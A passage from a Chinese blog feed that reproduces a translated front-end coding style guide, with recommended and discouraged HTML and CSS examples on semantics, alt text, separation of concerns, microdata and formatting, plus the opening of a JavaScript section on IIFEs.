class="name">header</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- As a page section belongs to the page structure heading elements should be used (in this case h2) --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>All news articles<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- If a section / module can be seen as an article (news article, blog entry, products teaser, any other</span></span><br><span class="line"><span class="comment">     re-usable module / section that can occur multiple times on a page) a article element should be used --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">"news-article"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- An article can contain a header that contains the summary / introduction information of the article --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- As a article title does not belong to the overall page structure there should not be any heading tag! --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"article-title"</span>&gt;</span>Good article<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Small can optionally be used to reduce importance --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">"intro"</span>&gt;</span>Introduction sub-title<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">&lt;!-- For the main content in a section or article there is no semantic element --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is a good example for HTML semantics<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- For content that is represented as side note or less important information in a given context use aside --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">aside</span> <span class="attr">class</span>=<span class="string">"article-side-notes"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>I think I'm more on the side and should not receive the main credits<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- Articles can also contain footers. If you have footnotes for an article place them into a footer element --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"article-foot-notes"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- The time element can be used to annotate a timestamp. Use the datetime attribute to specify ISO time</span></span><br><span class="line"><span class="comment">         while the actual text in the time element can also be more human readable / relative --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This article was created by David <span class="tag">&lt;<span class="name">time</span> <span class="attr">datetime</span>=<span class="string">"2014-01-01 00:00"</span> <span class="attr">class</span>=<span class="string">"time"</span>&gt;</span>1 month ago<span class="tag">&lt;/<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- In a section, footnotes or similar information can also go into a footer element --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"section-footer"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>Related sections: Events, Public holidays<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- Your page footer should go into a global footer element --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"page-footer"</span>&gt;</span></span><br><span class="line">  Copyright 2014</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="多媒体回溯"><a class="markdownIt-Anchor" href="#多媒体回溯"></a> 多媒体回溯</h2>
<p>对页面上的媒体而言，像图片、视频、canvas 动画等，要确保其有可替代的接入接口。图片文件我们可采用有意义的备选文本（alt），视频和音频文件我们可以为其加上说明文字或字幕。</p>
<p>提供可替代内容对可用性来说十分重要。试想，一位盲人用户如何能知晓一张图片是什么，要是没有 @alt 的话。</p>
<p>（图片的 alt 属性是可不填写内容的，纯装饰性的图片就可用这么做：<code>alt=&quot;&quot;</code>）。</p>
<p><strong>不推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"luke-skywalker.jpg"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"luke-skywalker.jpg"</span> <span class="attr">alt</span>=<span class="string">"Luke skywalker riding an alien horse"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>尽量用 alt 标签去描述图片，设想你需要对于那些只能通过语音或者看不见图片的用户表达图片到底是什么。<br />
<strong>不推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"huge-spaceship-approaching-earth.jpg"</span> <span class="attr">alt</span>=<span class="string">"Header image"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"huge-spaceship-approaching-earth.jpg"</span> <span class="attr">alt</span>=<span class="string">"A huge spaceship that is approaching the earth"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="关注点分离"><a class="markdownIt-Anchor" href="#关注点分离"></a> 关注点分离</h2>
<p>理解 web 中如何和为何区分不同的关注点，这很重要。这里的关注点主要指的是：信息（HTML 结构）、外观（CSS）和行为（JavaScript）。为了使它们成为可维护的干净整洁的代码，我们要尽可能的将它们分离开来。</p>
<p>严格地保证结构、表现、行为三者分离，并尽量使三者之间没有太多的交互和联系。</p>
<p>就是说，尽量在文档和模板中只包含结构性的 HTML；而将所有表现代码，移入样式表中；将所有动作行为，移入脚本之中。</p>
<p>在此之外，为使得它们之间的联系尽可能的小，在文档和模板中也尽量少地引入样式和脚本文件。</p>
<p>清晰的分层意味着：</p>
<ul>
<li>不使用超过一到两张样式表（i.e. main.css, vendor.css）</li>
<li>不使用超过一到两个脚本（学会用合并脚本）</li>
<li>不使用行内样式（<code>&lt;style&gt;.no-good {}&lt;/style&gt;</code>）</li>
<li>不在元素上使用 style 属性（<code>&lt;hr style=&quot;border-top: 5px solid black&quot;&gt;</code>）</li>
<li>不使用行内脚本（<code>&lt;script&gt;alert('no good')&lt;/script&gt;</code>）</li>
<li>不使用表象元素（i.e. <code>&lt;b&gt;</code>, <code>&lt;u&gt;</code>, <code>&lt;center&gt;</code>, <code>&lt;font&gt;</code>, <code>&lt;b&gt;</code>）</li>
<li>不使用表象 class 名（i.e. red, left, center）</li>
</ul>
<p><strong>不推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"base.css"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"grid.css"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"type.css"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"modules/teaser.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"font-size: 3rem"</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">b</span>&gt;</span>I'm a subtitle and I'm bold!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">center</span>&gt;</span>Dare you center me!<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    alert(<span class="string">'Just dont...'</span>);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"red"</span>&gt;</span>I'm important!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Concatinate your style sheets into a single one --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"main.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Don't use style attributes but assign sensible classes and apply styles in the stylesheet --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Don't use presentational elements and assign sensible classes --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sub-title"</span>&gt;</span>I'm a subtitle and I'm bold!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Maybe your comments get centered in your presentation but that decision is up to the stylesheet --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"comment"</span>&gt;</span>Dare you center me!<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- You wanted to make it red because it's important so then also name the class important and decide in the stylesheet</span></span><br><span class="line"><span class="comment">   what you want to do with it --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"important"</span>&gt;</span>I'm important!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">&lt;!-- Put all your scripts into files and concatinate them into a single one --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="html-内容至上"><a class="markdownIt-Anchor" href="#html-内容至上"></a> HTML 内容至上</h2>
<p>不要让非内容信息污染了你的 HTML。现在貌似有一种倾向：通过 HTML 来解决设计问题，这是显然是不对的。HTML 就应该只关注内容。</p>
<p>HTML 标签的目的，就是为了不断地展示内容信息。</p>
<ul>
<li>不要引入一些特定的 HTML 结构来解决一些视觉设计问题</li>
<li>不要将 <code>img</code> 元素当做专门用来做视觉设计的元素</li>
</ul>
<p>以下例子展示了误将 HTML 用来解决设计问题的这两种情况：</p>
<p><strong>不推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- We should not introduce an additional element just to solve a design problem  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-box"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"square"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  See the square next to me?</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.text-box</span> &gt; <span class="selector-class">.square</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- That's clean markup! --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-box"</span>&gt;</span></span><br><span class="line">  See the square next to me?</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We use a :before pseudo element to solve the design problem of placing a colored square in front of the text content */</span></span><br><span class="line"><span class="selector-class">.text-box</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>图片和 SVG 图形能被引入到 HTML 中的唯一理由是它们呈现出了与内容相关的一些信息。</p>
<p><strong>不推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Content images should never be used for design elements!  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-box"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"square.svg"</span> <span class="attr">alt</span>=<span class="string">"Square"</span> /&gt;</span></span><br><span class="line">  See the square next to me?</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- That's clean markup! --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-box"</span>&gt;</span></span><br><span class="line">  See the square next to me?</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We use a :before pseudo element with a background image to solve the problem */</span></span><br><span class="line"><span class="selector-class">.text-box</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(square.svg) no-repeat;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="type-属性"><a class="markdownIt-Anchor" href="#type-属性"></a> Type 属性</h2>
<p>省略样式表与脚本上的 type 属性。鉴于 HTML5 中以上两者默认的 type 值就是 <code>text/css</code> 和 <code>text/javascript</code>，所以 type 属性一般是可以忽略掉的。甚至在老旧版本的浏览器中这么做也是安全可靠的。</p>
<p><strong>不推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"main.css"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"main.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="可用性"><a class="markdownIt-Anchor" href="#可用性"></a> 可用性</h2>
<p>如果 HTML5 语义化标签使用得当，许多可用性问题已经引刃而解。ARIA 规则在一些语义化的元素上可为其添上默认的可用性角色属性，使用得当的话已使网站的可用性大部分成立。假如你使用 <code>nav</code>,  <code>aside</code>, <code>main</code>, <code>footer</code> 等元素，ARIA 规则会在其上应用一些关联的默认值。<br />
更多细节可参考 <a href="http://rawgit.com/w3c/aria-in-html/master/index.html#recommendations-table" target="_blank" rel="noopener">ARIA specification</a></p>
<p>另外一些角色属性则能够用来呈现更多可用性情景（i.e. <code>role=&quot;tab&quot;</code>）。</p>
<hr />
<h2 id="tab-index-在可用性上的运用"><a class="markdownIt-Anchor" href="#tab-index-在可用性上的运用"></a> Tab Index 在可用性上的运用</h2>
<p>检查文档中的 tab 切换顺序并传值给元素上的 tabindex，这可以依据元素的重要性来重新排列其 tab 切换顺序。你可以设置 <code>tabindex=&quot;-1&quot;</code>在任何元素上来禁用其 tab 切换。</p>
<p>当你在一个默认不可聚焦的元素上增加了功能，你应该总是为其加上 <code>tabindex</code> 属性使其变为可聚焦状态，而且这也会激活其 CSS 的伪类 <code>:focus</code>。选择合适的 <code>tabindex</code> 值，或是直接使用  <code>tabindex=&quot;0&quot;</code> 将元素们组织成同一 tab 顺序水平，并强制干预其自然阅读顺序。</p>
<hr />
<h2 id="微格式在-seo-和可用性上的运用"><a class="markdownIt-Anchor" href="#微格式在-seo-和可用性上的运用"></a> 微格式在 SEO 和可用性上的运用</h2>
<p>如果 SEO 和可用性环境条件允许的话，建议考虑采用微格式。微格式是通过在元素标签上申明一系列特定数据来达成特定语义的方法。</p>
<p>谷歌、微软和雅虎对如何使用这些额外的数据一定程度上的达成一致，如果正确的使用，这将给搜索引擎优化带来巨大的好处。</p>
<p>你可以访问 <a href="http://schema.org/" target="_blank" rel="noopener">schema.org</a> 获得更多内容细节。</p>
<p>看一个电影网站的简单例子：</p>
<p><strong>不带微格式</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Avatar<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">span</span>&gt;</span>Director: James Cameron (born August 16, 1954)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">span</span>&gt;</span>Science fiction<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"../movies/avatar-theatrical-trailer.html"</span>&gt;</span>Trailer<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>带有微格式</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">itemscope</span> <span class="attr">itemtype</span> =<span class="string">"http://schema.org/Movie"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">itemprop</span>=<span class="string">"name"</span>&gt;</span>Avatar<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">itemprop</span>=<span class="string">"director"</span> <span class="attr">itemscope</span> <span class="attr">itemtype</span>=<span class="string">"http://schema.org/Person"</span>&gt;</span></span><br><span class="line">  Director: <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">"name"</span>&gt;</span>James Cameron<span class="tag">&lt;/<span class="name">span</span>&gt;</span> (born <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">"birthDate"</span>&gt;</span>August 16, 1954)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">"genre"</span>&gt;</span>Science fiction<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"../movies/avatar-theatrical-trailer.html"</span> <span class="attr">itemprop</span>=<span class="string">"trailer"</span>&gt;</span>Trailer<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="id-和锚点"><a class="markdownIt-Anchor" href="#id-和锚点"></a> ID 和锚点</h2>
<p>通常一个比较好的做法是将页面内所有的头部标题元素都加上 ID. 这样做，页面 URL 的 hash 中带上对应的 ID 名称，即形成描点，方便跳转至对应元素所处位置。</p>
<p>打个比方，当你在浏览器中输入 URL <code>http://your-site.com/about#best-practices</code>，浏览器将定位至以下 H3 上。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">"best-practices"</span>&gt;</span>Best practices<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="格式化规则"><a class="markdownIt-Anchor" href="#格式化规则"></a> 格式化规则</h2>
<p>在每一个块状元素，列表元素和表格元素后，加上一新空白行，并对其子孙元素进行缩进。内联元素写在一行内，块状元素还有列表和表格要另起一行。</p>
<p>（如果由于换行的空格引发了不可预计的问题，那将所有元素并入一行也是可以接受的，格式警告总好过错误警告）。</p>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>Space<span class="tag">&lt;/<span class="name">em</span>&gt;</span>, the final frontier.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Moe<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Larry<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Curly<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">scope</span>=<span class="string">"col"</span>&gt;</span>Income<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">scope</span>=<span class="string">"col"</span>&gt;</span>Taxes<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>$ 5.00<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>$ 4.50<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<hr />
<h2 id="html-引号"><a class="markdownIt-Anchor" href="#html-引号"></a> HTML 引号</h2>
<p>使用双引号(“”) 而不是单引号(”) 。</p>
<blockquote>
<p>js 中尽量使用单引号(”)</p>
</blockquote>
<p><strong>不推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'news-article'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>推荐</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"news-article"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端编码规范</category>
        <category>Front-End&quot;</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>编码规范</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>前端编码风格规范(3) 之 JavaScript</title>
    <url>/hexolog/post/87ab92a0.html</url>
    <content><![CDATA[<blockquote>
<p>英文原文：<a href="https://github.com/gionkunz/chartist-js/blob/develop/CODINGSTYLE.md" target="_blank" rel="noopener">Web Styleguide – Style guide to harmonize HTML, Javascript and CSS / SASS coding style</a></p>
</blockquote>
<h2 id="javascript-规范"><a class="markdownIt-Anchor" href="#javascript-规范"></a> JavaScript 规范</h2>
<hr />
<h3 id="全局命名空间污染与-iife"><a class="markdownIt-Anchor" href="#全局命名空间污染与-iife"></a> 全局命名空间污染与 IIFE</h3>
<p>总是将代码包裹成一个 IIFE(Immediately-Invoked Function Expression)，用以创建独立隔绝的定义域。这一举措可防止全局命名空间被污染。</p>
<p>IIFE 还可确保你的代码不会轻易被其它全局命名空间里的代码所修改（i.e. 第三方库，window 引用，被覆盖的未定义的关键字等等）。</p>
<p><strong>不推荐</strong></p>
<pre><code>var x = 10,
    y = 100;

// Declaring variables in the global scope is resulting in global scope pollution. All variables declared like this
// will be stored in the window object. This is very unclean and needs to be avoided.
console.log(window.x + ' ' + window.y);
</code></pre>
<p><strong>推荐</strong></p>
<pre><code>// We declare a IIFE and pass parameters into the function that we will use from the global space
(function(log, w, undefined){
  'use strict';

  var x = 10,
      y = 100;

  // Will output 'true true'
  log((w.x === undefined) + ' ' + (w.y === undefined));

}(window.console.log, window));
</code></pre>
<a id="more"></a>
<hr />
<h3 id="iife立即执行的函数表达式"><a class="markdownIt-Anchor" href="#iife立即执行的函数表达式"></a> IIFE（立即执行的函数表达式）</h3>
